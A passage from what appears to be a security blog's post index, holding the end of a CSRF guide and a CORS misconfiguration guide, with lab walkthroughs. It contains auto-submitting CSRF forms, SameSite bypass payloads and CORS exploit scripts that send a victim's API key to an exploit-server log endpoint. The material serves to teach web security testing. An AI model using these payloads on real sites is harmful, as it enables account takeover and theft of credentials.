unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions (like submitting a form), the client must include the correct CSRF token in the request. This makes it difficult for attackers to forge a valid request.Example of CSRF Token in an HTML Form:&lt;form action=\"/my-account/change-email\" method=\"POST\"&gt;    &lt;input type=\"hidden\" name=\"csrf\" value=\"50FaWgdOhi9M9wyna8taR1k3ODOR8d6u\"&gt;    &lt;input type=\"email\" name=\"email\" value=\"example@normal-website.com\"&gt;    &lt;button type=\"submit\"&gt;Update email&lt;/button&gt;&lt;/form&gt;When the form is submitted, the request includes the CSRF token:POST /my-account/change-email HTTP/1.1Host: normal-website.comContent-Length: 70Content-Type: application/x-www-form-urlencodedcsrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.comIf the token is missing or incorrect, the server rejects the request.2. SameSite CookiesSameSite is a browser security feature that controls when cookies are sent with cross-site requests. Since actions requiring authenticated session cookies are often vulnerable to CSRF, setting SameSite restrictions (e.g., Lax or Strict) can block attackers from triggering actions from other websites.  Strict: Cookies are only sent in a first-party context, meaning they won’t be included in any cross-site requests.  Lax: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests (e.g., images or iframes).  None: Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure” (i.e., transmitted over HTTPS).Example of Setting a SameSite Cookie:Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict3. Referer-Based ValidationSome applications use the Referer header to check if a request originates from the application’s own domain. This prevents cross-site requests, but it’s generally less effective than CSRF token validation because the Referer header can be manipulated or blocked by the victim’s browser.Bypassing SameSite Lax Restrictions Using GET RequestsEven with Lax SameSite restrictions, attackers can still perform CSRF attacks if the server allows GET requests to trigger sensitive actions. For example:GET /email/change?email=pwned@evil-user.net HTTP/1.1Host: vulnerable-website.comCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmIn this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.Example of Bypassing CSRF Token ValidationIf the application validates the CSRF token only if it is present in the request, attackers can exploit this by simply removing the token parameter from the request. For example:POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 25Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmemail=pwned@evil-user.net # THE CSRF TOKEN IS REMOVED HERESince the CSRF token is not present, and if the application doesn’t enforce checks for the missing token, the attacker can still perform the malicious action.Common Flaws in CSRF Token Validation and Advanced Bypass TechniquesCommon Flaws in CSRF Token ValidationEven when applications implement CSRF tokens, improper validation can render the defense ineffective. Below are some common flaws that attackers can exploit to bypass CSRF protection:1. Validation of CSRF Token Depends on Request MethodIn some applications, CSRF token validation is only enforced when the request uses the POST method but is skipped for GET requests. This can lead to vulnerabilities because GET requests can still modify user data or perform sensitive actions without triggering token checks.Example Exploit:An attacker can exploit this by switching to the GET method, which doesn’t trigger token validation. For example, the following request could bypass CSRF protection:GET /email/change?email=pwned@evil-user.net HTTP/1.1Host: vulnerable-website.comCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmHere, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform a malicious action (like changing the email) without being detected.2. Validation of CSRF Token Depends on Token Being PresentAnother common flaw occurs when applications validate the CSRF token only if it is present in the request. If the token is omitted, some applications may skip validation entirely.Example Exploit:An attacker can exploit this vulnerability by simply removing the token parameter from the request. Since no token is included, the application may fail to validate the absence of the token, allowing the attacker to carry out a CSRF attack.For example, an attacker could send the following request, omitting the CSRF token:POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 25Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmemail=pwned@evil-user.net # THE CSRF TOKEN IS REMOVED HERESince the CSRF token is not present, and if the application doesn’t enforce any checks for the missing token, the attacker can still perform the malicious action, such as changing the user’s email address, without being blocked.3. CSRF Token is Not Tied to the User SessionA critical flaw in some applications is the failure to ensure that the CSRF token belongs to the same session as the user making the request. Instead of validating that the token is unique to the user session, the application may accept any token from a global pool of previously issued tokens.How the Attack Works:  The attacker logs into the application with their own account, obtaining a valid CSRF token tied to their session.  The attacker then creates a malicious CSRF request and includes the valid token obtained from their own session.  The attacker sends this request to a victim, hoping the victim will unknowingly trigger the request while logged into the vulnerable application.  Because the application only checks if the CSRF token is valid (without verifying whether it matches the victim’s session), the attack can succeed, allowing the attacker to perform actions on behalf of the victim.Example:POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 68Cookie: session=victim-session-idcsrf=attacker-csrf-token&amp;email=pwned@evil-user.net4. CSRF Token is Tied to a Non-Session CookieIn some cases, instead of tying the CSRF token to the session (which is secure), the application ties the CSRF token to a different cookie that is not used for session tracking. This can happen when:  The application uses separate frameworks for session management and CSRF protection.  These frameworks are not properly integrated, so they don’t share the same session state.Example Request:POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 68Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dvcsrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com  The session cookie (pSJYSScWKpmC60LpFOAHKixuFuM4uXWF) tracks the user’s session.  The csrfKey cookie (rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv) is used to validate the CSRF token (RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY).Notice that the CSRF token is validated against the csrfKey cookie, not the session cookie.Why Is This Vulnerable?This setup is vulnerable because the CSRF token is no longer tightly coupled with the user’s session. Instead, it depends on a separate cookie (csrfKey). If an attacker can manipulate this cookie, they can bypass the CSRF protection.How Can an Attacker Exploit This?  Obtain a Valid CSRF Token and Associated Cookie:          The attacker logs into their own account on the application.      They obtain a valid CSRF token and its corresponding csrfKey cookie.        Set the Attacker’s csrfKey Cookie in the Victim’s Browser:          If the application has any functionality that allows setting cookies (e.g., via JavaScript, HTTP headers, or another subdomain), the attacker can exploit this to set their csrfKey cookie in the victim’s browser.      For example:                  A cookie-setting function on staging.demo.normal-website.com could set a cookie that is submitted to secure.normal-website.com.          The attacker leverages this behavior to place their csrfKey cookie in the victim’s browser.                      Craft a Malicious CSRF Request:          The attacker creates a malicious request (e.g., changing the victim’s email address) and includes their valid CSRF token.      When the victim’s browser sends the request, it includes:                  The attacker’s csrfKey cookie (set earlier).          The attacker’s valid CSRF token (included in the malicious request).                      Bypass CSRF Protection:          The server validates the CSRF token against the csrfKey cookie.      Since both the token and cookie belong to the attacker, the validation passes.      The server processes the request as if it came from the victim, even though the victim did not intend to perform the action.      5. CSRF Token is Simply Duplicated in a CookieIn a variation of the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the “double submit” defense against CSRF.Example Request:POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 68Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpacsrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.comWhy Is This Vulnerable?The attacker can again perform a CSRF attack if the website contains any cookie-setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.Example Exploit:&lt;script&gt;    document.cookie = \"csrf=abcd1234\";&lt;/script&gt;&lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;    &lt;input type=\"hidden\" name=\"csrf\" value=\"abcd1234\"&gt;    &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\"&gt;&lt;/form&gt;&lt;script&gt;    document.forms[0].submit();&lt;/script&gt;Advanced Techniques for Bypassing CSRF Defenses1. Bypassing SameSite Lax Restrictions Using GET RequestsEven with Lax SameSite restrictions, attackers can still perform CSRF attacks if the server allows GET requests to trigger sensitive actions. For example:GET /email/change?email=pwned@evil-user.net HTTP/1.1Host: vulnerable-website.comCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmIn this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.2. Using history.pushState to Mask the AttackAttackers can use the history.pushState function to modify the browser’s URL history and mask the attack. This can help avoid detection by users or security tools.Example Exploit:&lt;script&gt;    history.pushState('', '', '/');&lt;/script&gt;&lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;    &lt;input type=\"hidden\" name=\"_method\" value=\"GET\"&gt;    &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\"&gt;&lt;/form&gt;&lt;script&gt;    document.forms[0].submit();&lt;/script&gt;SameSite Cookie Restrictions and Bypass TechniquesWhat is SameSite in the Context of Cookies?SameSite is a browser security mechanism that determines when a website’s cookies are included in requests originating from other websites. It provides partial protection against a variety of cross-site attacks, including:  CSRF (Cross-Site Request Forgery)  Cross-Site Leaks  Some CORS (Cross-Origin Resource Sharing) ExploitsSince 2021, Chrome applies Lax SameSite restrictions by default if the website that issues the cookie doesn’t explicitly set its own restriction level. This is a proposed standard, and other major browsers are expected to adopt this behavior in the future. As a result, it’s essential to understand how these restrictions work, as well as how they can potentially be bypassed.How Does SameSite Work?SameSite allows website owners to restrict cookie sharing based on three levels:  Strict:          Cookies are only sent in a first-party context, meaning they won’t be included in any cross-site requests.      This provides the strongest protection but may break functionality for users navigating between sites.        Lax:          Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests (e.g., images or iframes).      This offers a balance between security and usability.        None:          Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure” (i.e., transmitted over HTTPS).      By limiting when cookies are sent, SameSite reduces the risk of CSRF attacks, where attackers trick a user’s browser into making unauthorized requests using their authenticated session.Setting SameSite AttributesDevelopers can manually configure a restriction level for each cookie they set by including the SameSite attribute in the Set-Cookie response header, along with their preferred value:Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=StrictIf the website issuing the cookie doesn’t explicitly set a SameSite attribute, Chrome automatically applies Lax restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior.Bypassing SameSite Lax Restrictions Using GET RequestsEven with Lax SameSite restrictions, attackers can still perform CSRF attacks if the server allows GET requests to trigger sensitive actions. For example:GET /email/change?email=pwned@evil-user.net HTTP/1.1Host: vulnerable-website.comCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmIn this case, the attacker doesn’t need to provide a valid CSRF token, as GET requests may not require token validation, thus enabling the attacker to perform malicious actions (like changing the email) without being detected.Using _method Parameter to Override HTTP MethodsSome frameworks allow overriding the HTTP method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes.Example Exploit:&lt;script&gt;    history.pushState('', '', '/');&lt;/script&gt;&lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;    &lt;input type=\"hidden\" name=\"_method\" value=\"GET\"&gt;    &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\"&gt;&lt;/form&gt;&lt;script&gt;    document.forms[0].submit();&lt;/script&gt;Here’s what happens in this exploit:  history.pushState:          The history.pushState function modifies the browser’s history and URL without reloading the page. In this case, it changes the URL path to /, which may help mask the attack or avoid detection.        Form Action:          The form’s action attribute points to the target endpoint: https://vulnerable-website.com/email/change.      This is the URL where the malicious request will be sent.        Hidden Input Fields:          The form includes hidden input fields:                  _method: Overrides the HTTP method to GET (useful if the server accepts method overrides).          email: Sets the victim’s email to pwned@evil-user.net.                      Automatic Submission:          The JavaScript at the end (document.forms[0].submit();) automatically submits the form when the page loads, making the attack seamless and invisible to the user.      Bypassing SameSite with Top-Level NavigationIf the application uses Lax SameSite restrictions, cookies are still sent during top-level navigation (e.g., clicking a link). Attackers can exploit this by crafting a malicious link that triggers a sensitive action via a GET request.Example:&lt;a href=\"https://vulnerable-website.com/email/change?email=pwned@evil-user.net\"&gt;Click here!&lt;/a&gt;When the victim clicks the link, their browser sends the request with their session cookie, allowing the attacker to change the victim’s email address.Bypassing SameSite with Cookie InjectionIf an attacker can inject cookies into the victim’s browser (e.g., via subdomains or JavaScript), they can bypass SameSite restrictions. For example:      Injecting a Malicious Cookie:An attacker could use JavaScript to set a cookie on a subdomain:    document.cookie = \"session=attacker-session-id; domain=.example.com; path=/\";            Crafting a Malicious Request:The attacker then creates a malicious request that includes the injected cookie:    POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 68Cookie: session=attacker-session-idemail=pwned@evil-user.net      What is a Site in the Context of SameSite Cookies?In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD) plus one additional level of the domain name (often referred to as TLD+1). For example:  example.com → TLD+1  app.example.com → Subdomain of TLD+1When determining whether a request is same-site or not, the URL scheme is also taken into consideration. This means that a link from http://app.example.com to https://app.example.com is treated as cross-site by most browsers.Difference Between a Site and an OriginThe difference between a site and an origin lies in their scope:  A site encompasses multiple domain names.  An origin only includes one specific domain.Two URLs are considered to have the same origin if they share the exact same scheme, domain name, and port.            Request From      Request To      Same-Site?      Same-Origin?                  https://example.com      https://example.com      Yes      Yes              https://app.example.com      https://intranet.example.com      Yes      No: mismatched domain name              https://example.com      https://example.com:8080      Yes      No: mismatched port              https://example.com      https://example.co.uk      No: mismatched eTLD      No: mismatched domain name              https://example.com      http://example.com      No: mismatched scheme      No: mismatched scheme      This distinction is crucial because any vulnerability enabling arbitrary JavaScript execution can be abused to bypass site-based defenses on other domains belonging to the same site.ConclusionWhile SameSite cookies provide a strong layer of protection against CSRF attacks, they are not foolproof. Attackers can still bypass these restrictions in certain scenarios, such as:  Using GET requests to trigger sensitive actions.  Leveraging top-level navigation to include cookies.  Injecting malicious cookies into the victim’s browser.Understanding how SameSite works and how it can be bypassed is essential for both developers and security professionals to ensure robust protection against CSRF and other cross-site attacks.Summary and Best Practices for Defending Against CSRFSummary of CSRF VulnerabilitiesCross-Site Request Forgery (CSRF) is a web security vulnerability that tricks users into performing actions they didn’t intend to. It exploits the trust that a website has in a user’s browser, allowing an attacker to perform unauthorized actions on behalf of an authenticated user without their knowledge.Key Points:  How CSRF Works:          CSRF attacks bypass the same-origin policy by forcing users to make unintended requests to a site where they are already authenticated.      The browser automatically includes session cookies with these requests, making it appear as though the user initiated the action.        Conditions for a Successful CSRF Attack:          Relevant Action: The attacker must have a reason to induce an action within the application (e.g., changing account settings).      Cookie-Based Session Handling: The application must rely solely on session cookies to authenticate and identify the user.      No Unpredictable Request Parameters: The action must not require any parameters that are difficult or impossible for the attacker to guess.        Common Flaws in CSRF Token Validation:          Validation Depends on Request Method: Some applications only enforce CSRF token validation for POST requests but skip it for GET requests.      Validation Depends on Token Being Present: If the token is omitted, some applications may skip validation entirely.      Token Not Tied to User Session: If the token is validated against a global pool of tokens rather than the user’s session, attackers can exploit this.      Token Tied to Non-Session Cookie: If the token is tied to a cookie other than the session cookie, attackers can manipulate this cookie to bypass CSRF protection.      Double Submit Cookie: If the token is duplicated in both a cookie and a request parameter, attackers can exploit cookie-setting functionality to bypass CSRF defenses.        SameSite Cookies:          Strict: Cookies are only sent in first-party contexts.      Lax: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests.      None: Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure.”      Best Practices for Defending Against CSRFTo protect your web application from CSRF attacks, follow these best practices:1. Use CSRF Tokens      What Are CSRF Tokens?A CSRF token is a unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions (like submitting a form), the client must include the correct CSRF token in the request.        How to Implement CSRF Tokens:Embed the CSRF token as a hidden input field in HTML forms or include it in HTTP headers for AJAX requests.     &lt;form action=\"/my-account/change-email\" method=\"POST\"&gt;       &lt;input type=\"hidden\" name=\"csrf\" value=\"50FaWgdOhi9M9wyna8taR1k3ODOR8d6u\"&gt;       &lt;input type=\"email\" name=\"email\" value=\"example@normal-website.com\"&gt;       &lt;button type=\"submit\"&gt;Update email&lt;/button&gt;   &lt;/form&gt;  Effectiveness:When implemented correctly, CSRF tokens make it extremely difficult for attackers to forge valid requests because they cannot predict or guess the token.2. Implement SameSite Cookies      Why Use SameSite Cookies?SameSite cookies help prevent CSRF attacks by controlling when cookies are sent with cross-site requests. By default, Chrome applies Lax restrictions, but you should explicitly set the SameSite attribute for better control.        How to Set SameSite Cookies:Include the SameSite attribute in the Set-Cookie response header:    Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict            Levels of SameSite Restrictions:          Strict: Cookies are only sent in first-party contexts.      Lax: Cookies are sent with top-level navigations (e.g., clicking a link) but not with cross-site subrequests.      None: Cookies are sent with all requests, including cross-site ones, but must be marked as “Secure.”      3. Validate the Referer Header      How It Works:Some applications use the Referer header to check if a request originates from the application’s own domain. This prevents cross-site requests, but it’s generally less effective than CSRF token validation because the Referer header can be manipulated or blocked by the victim’s browser.        Limitations:While this method can add an extra layer of defense, it should not be relied upon as the sole protection against CSRF. Always combine it with other measures like CSRF tokens.  4. Avoid Using GET Requests for Sensitive Actions      Why Avoid GET Requests?GET requests are more vulnerable to CSRF attacks because they can be triggered via simple links or embedded resources (e.g., images). Always use POST (or other HTTP methods like PUT or DELETE) for actions that modify data or state.        Example:Instead of allowing email changes via a GET request:    GET /email/change?email=pwned@evil-user.net HTTP/1.1Host: vulnerable-website.com        Require a POST request with proper CSRF token validation:    POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 70Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmcsrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.com      5. Educate Users About Security Risks      User Awareness:Educate users about the risks of clicking on suspicious links or visiting untrusted websites. Encourage them to log out of sensitive applications when not in use and to use browser extensions that block malicious scripts.        Browser Security Features:Modern browsers offer features like SameSite cookies and Content Security Policy (CSP) that can help mitigate CSRF attacks. Ensure your application takes full advantage of these features.  6. Regularly Test for CSRF Vulnerabilities      Penetration Testing:Regularly test your application for CSRF vulnerabilities using tools like Burp Suite, CSRFShark, or Nakanosec CSRF Tool. These tools can help identify weaknesses in your CSRF defenses.        Automated Scanning:Use automated security scanners to detect potential CSRF vulnerabilities in your application. However, manual testing is often necessary to uncover more complex issues.  "
  },
  
  {
    "title": "Cross-Origin Resource Sharing (CORS)",
    "url": "/posts/cors-guide",
    "categories": "Guides, Web Pentesting",
    "tags": "Guides, CSRF, Web Pentesting",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Introduction to Cross-Origin Resource Sharing (CORS)Cross-origin resource sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It ext...",
    "content": "Introduction to Cross-Origin Resource Sharing (CORS)Cross-origin resource sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP), which restricts how websites can interact with resources outside their source domain. While CORS provides greater flexibility for developers, it also introduces potential security risks if not configured properly.Table of Contents  What is CORS?  Same-Origin Policy  Relaxation of the Same-Origin Policy  Vulnerabilities Arising from CORS Misconfigurations  Exploiting CORS Misconfigurations  Preventing CORS-Based Attacks  Key TakeawaysWhat is CORS?CORS is a mechanism that allows servers to specify which external domains are permitted to access their resources. It uses HTTP headers to define trusted origins and associated properties, such as whether authenticated access is allowed. For example:Access-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: trueThese headers enable cross-origin requests while maintaining some level of control over who can access the resources.Same-Origin PolicyThe same-origin policy is a restrictive cross-origin specification designed to prevent malicious cross-domain interactions. It limits a website’s ability to interact with resources outside its source domain. For example:  A script on https://example.com cannot directly access resources on https://another-example.com.  However, it can issue requests to other domains, but it cannot access the responses unless explicitly allowed by CORS.This policy was introduced to mitigate risks like one website stealing private data from another.Relaxation of the Same-Origin PolicyWhile the same-origin policy is effective at preventing unauthorized access, it can be overly restrictive for modern web applications that need to interact with subdomains or third-party services. To address this, developers use cross-origin resource sharing (CORS) to relax the same-origin policy in a controlled manner.CORS works by using a suite of HTTP headers that define trusted origins and permissions. For example:  The Access-Control-Allow-Origin header specifies which origins are allowed to access a resource.  The Access-Control-Allow-Credentials header determines whether cookies and authentication tokens can be included in cross-origin requests.Vulnerabilities Arising from CORS MisconfigurationsMany modern websites use CORS to allow access from subdomains and trusted third parties. However, misconfigurations in CORS policies can lead to exploitable vulnerabilities. Common issues include:  Reflecting Arbitrary Origins: Allowing any origin by reflecting the Origin header without validation can expose sensitive data to malicious websites.  Whitelist Implementation Errors: Misconfigured whitelists (e.g., using prefix or suffix matching) can lead to unintended access.  Null Origin Risks: Whitelisting the null origin can introduce vulnerabilities, especially in edge cases like file-based requests or sandboxed environments.Exploiting CORS MisconfigurationsCORS misconfigurations can lead to serious vulnerabilities, allowing attackers to access sensitive data or perform unauthorized actions. Below, we’ll walk through a step-by-step process to exploit a misconfigured CORS policy.Step-by-Step Walkthrough: Exploiting CORS Misconfigurations1. Initial Setup: Logging In and Observing Behavior      Turn Off Intercept in Burp Suite:    Ensure that intercept is turned off in Burp Suite so that your browser can communicate with the target application without interruptions.        Log In to Your Account:    Use Burp’s built-in browser to log in to your account on the target application. Once logged in, navigate to the “My Account” page.        Inspect the AJAX Request:    Open the HTTP history in Burp Suite and review the requests made when you access the “My Account” page. You should notice that your account details (including sensitive information like your API key) are retrieved via an AJAX request to the /accountDetails endpoint.        Check for CORS Headers:    Look at the response headers for this request. Specifically, check for the presence of the Access-Control-Allow-Credentials: true header. This header indicates that the server supports CORS and allows credentials (like cookies) to be sent with cross-origin requests. This is a potential indicator that the server may have a misconfigured CORS policy.  2. Testing the CORS Policy      Send the Request to Burp Repeater:    Right-click on the /accountDetails request in Burp’s HTTP history and select “Send to Repeater”. This allows you to manually modify and resend the request.        Add the Origin: null Header:    In Burp Repeater, add a new header to the request:    Origin: null        This simulates a cross-origin request from a null origin, which can occur in certain edge cases (e.g., sandboxed iframes or file-based requests).        Resubmit the Request:    Send the modified request and observe the server’s response. If the server reflects the null origin in the Access-Control-Allow-Origin header, it means the server is vulnerable to CORS misconfiguration. For example, the response might look like this:    Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true        This indicates that the server allows requests from the null origin and permits credentials (like cookies) to be included in those requests.  3. Crafting the Exploit      Go to the Exploit Server:    In the lab environment, navigate to the exploit server provided for testing. This server allows you to host malicious HTML/JavaScript code.        Enter the Malicious HTML Code:    Paste the following HTML code into the exploit server’s input field. Replace YOUR-LAB-ID with the unique URL of your lab instance and YOUR-EXPLOIT-SERVER-ID with the ID of your exploit server:    &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);    req.withCredentials = true;    req.send();    function reqListener() {        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;    };&lt;/script&gt;\"&gt;&lt;/iframe&gt;        Explanation of the Code:          The &lt;iframe&gt; element uses the sandbox attribute to create a restricted environment. This generates a null origin for the request.      Inside the iframe, JavaScript makes an AJAX request (XMLHttpRequest) to the /accountDetails endpoint of the target application.      The withCredentials = true setting ensures that cookies (and thus the victim’s session) are included in the request.      When the response is received, the reqListener function redirects the browser to the exploit server’s /log endpoint, appending the victim’s API key (or other sensitive data) as a query parameter in the URL.      4. Testing the Exploit      View the Exploit:    Click the “View exploit” button on the exploit server. This simulates a victim visiting the malicious page.        Observe the Result:    After viewing the exploit, you should be redirected to the /log page on the exploit server. Check the URL of the page—it should now include the victim’s API key as part of the query string. For example:    https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=VICTIM_API_KEY        This confirms that the exploit successfully retrieved the victim’s sensitive data.  5. Delivering the Exploit to the Victim      Deliver the Exploit:    Once you’ve confirmed that the exploit works, click the “Deliver exploit to victim” button. This simulates sending the malicious link to the victim.        Access the Log:    After delivering the exploit, go back to the exploit server and click “Access log”. The log will show the victim’s API key, which was captured when they visited the malicious page.        Submit the Key:    Copy the victim’s API key and submit it to complete the lab.  Exploiting XSS via CORS Trust RelationshipsEven when CORS is “correctly” configured, it inherently establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to Cross-Site Scripting (XSS), an attacker can exploit the XSS vulnerability to inject malicious JavaScript. This injected script can then use CORS to retrieve sensitive information from the trusted site.How It WorksConsider the following request:GET /api/requestApiKey HTTP/1.1Host: vulnerable-website.comOrigin: https://subdomain.vulnerable-website.comCookie: sessionid=...If the server responds with:HTTP/1.1 200 OKAccess-Control-Allow-Origin: https://subdomain.vulnerable-website.comAccess-Control-Allow-Credentials: trueThis response indicates that vulnerable-website.com trusts requests originating from https://subdomain.vulnerable-website.com. If an attacker discovers an XSS vulnerability on subdomain.vulnerable-website.com, they can exploit it to inject malicious JavaScript that uses CORS to retrieve sensitive data (e.g., API keys) from vulnerable-website.com.For example, the attacker could craft a URL like this:document.location = 'https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;/*malicious code*/&lt;/script&gt;';The injected script would make a cross-origin request to vulnerable-website.com and exfiltrate sensitive information using the trust relationship established by CORS.Breaking TLS with Poorly Configured CORSA poorly configured CORS policy can undermine the security benefits of HTTPS. For instance, if an application that strictly enforces HTTPS whitelists a trusted subdomain that uses plain HTTP, it creates a vulnerability. Consider the following request:GET /api/requestApiKey HTTP/1.1Host: vulnerable-website.comOrigin: http://trusted-subdomain.vulnerable-website.comCookie: sessionid=...If the server responds with:HTTP/1.1 200 OKAccess-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.comAccess-Control-Allow-Credentials: trueThis means that vulnerable-website.com trusts requests from http://trusted-subdomain.vulnerable-website.com, even though the subdomain uses plain HTTP. An attacker could intercept or manipulate the insecure HTTP traffic to steal sensitive data or perform malicious actions.Example Exercise: Exploiting CORS Misconfiguration via XSSStep-by-Step Walkthrough  Initial Setup: Logging In and Observing Behavior          Turn Off Intercept in Burp Suite: Ensure that intercept is turned off so your browser can communicate with the target application without interruptions.      Log In and Access Your Account Page: Use Burp’s built-in browser to log in to your account and navigate to the account page.      Inspect the AJAX Request: Open the HTTP history in Burp Suite and observe that your account details (including sensitive information like your API key) are retrieved via an AJAX request to /accountDetails.      Check for CORS Headers: Look at the response headers for this request. Specifically, check for the presence of the Access-Control-Allow-Credentials: true header, which suggests that the server supports CORS.        Testing the CORS Configuration          Send the Request to Burp Repeater: Right-click on the /accountDetails request in Burp’s HTTP history and select “Send to Repeater”.      Add the Origin Header: Modify the request by adding the following header:        Origin: http://stock.YOUR-LAB-ID.web-security-academy.net                    Resubmit the Request: Send the modified request and observe the server’s response. If the Origin is reflected in the Access-Control-Allow-Origin header, it confirms that the CORS configuration allows access from arbitrary subdomains, including both HTTPS and HTTP.        Identifying an XSS Vulnerability          Open a Product Page: Navigate to a product page and click “Check stock”.      Observe the HTTP URL: Notice that the stock-checking functionality is loaded using an HTTP URL on a subdomain (e.g., http://stock.YOUR-LAB-ID.web-security-academy.net).      Test for XSS: Observe that the productID parameter is vulnerable to XSS. For example, you can inject a payload like &lt;script&gt;alert(1)&lt;/script&gt; into the productID parameter to confirm the vulnerability.        Crafting the Exploit          Go to the Exploit Server: Navigate to the exploit server provided in the lab environment.              Enter the Malicious HTML Code: Paste the following HTML code into the exploit server’s input field. Replace YOUR-LAB-ID with your unique lab domain name and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:        &lt;script&gt;    document.location = 'http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=&lt;script&gt;var req = new XMLHttpRequest();req.onload=reqListener;req.open(\"get\",\"https://YOUR-LAB-ID.web-security-academy.net/accountDetails\",true);req.withCredentials=true;req.send();function reqListener(){location=\"https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=\"+this.responseText;};&lt;/script&gt;';&lt;/script&gt;                Explanation of the Code:                  The document.location redirects the victim to the vulnerable subdomain (stock.YOUR-LAB-ID.web-security-academy.net) with an XSS payload embedded in the productID parameter.          The injected script makes a CORS request to /accountDetails on the main domain (YOUR-LAB-ID.web-security-academy.net) to retrieve the victim’s API key.          The API key is then exfiltrated to the exploit server by appending it as a query parameter in the URL.                      Testing the Exploit          View the Exploit: Click the “View exploit” button on the exploit server to simulate a victim visiting the malicious page.      Observe the Result: After viewing the exploit, you should be redirected to the /log page on the exploit server. Check the URL—it should now include the victim’s API key as part of the query string.        Delivering the Exploit to the Victim          Deliver the Exploit: Once you’ve confirmed that the exploit works, click the “Deliver exploit to victim” button to simulate sending the malicious link to the victim.      Access the Log: Go back to the exploit server and click “Access log”. Retrieve the victim’s API key from the log and submit it to complete the lab.      Intranets and CORS Without CredentialsMost CORS attacks rely on the presence of the following response header:Access-Control-Allow-Credentials: trueThis header allows the victim’s browser to send cookies and other credentials with cross-origin requests. Without this header, the browser will refuse to send cookies, meaning the attacker will only gain access to unauthenticated content. In such cases, the attacker could just as easily access the same content by browsing directly to the target website.However, there is one common scenario where an attacker cannot access a website directly: when the target is part of an organization’s intranet and located within private IP address space. Internal websites are often held to a lower security standard than external sites, making them more vulnerable to exploitation. Attackers can leverage these vulnerabilities to gain further access within the private network.Example Scenario: Exploiting CORS in an IntranetRequestGET 